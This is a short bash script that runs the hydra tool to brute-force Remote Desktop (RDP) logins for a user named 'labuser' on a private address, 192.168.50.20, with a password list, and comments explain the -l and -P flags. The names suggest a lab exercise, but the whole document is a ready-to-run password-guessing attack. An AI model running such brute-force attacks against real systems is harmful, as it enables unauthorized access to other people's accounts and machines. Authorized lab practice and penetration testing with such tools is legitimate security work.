#!/usr/bin/env bash
TARGET="192.168.50.20"
USER="labuser"
PWD_LIST="./passwords.txt"

hydra -l "$USER" -P "$PWD_LIST" rdp://$TARGET -t 1 -W 3
# -l : specifies the username
# -P : specifies the password list in passwords.txt
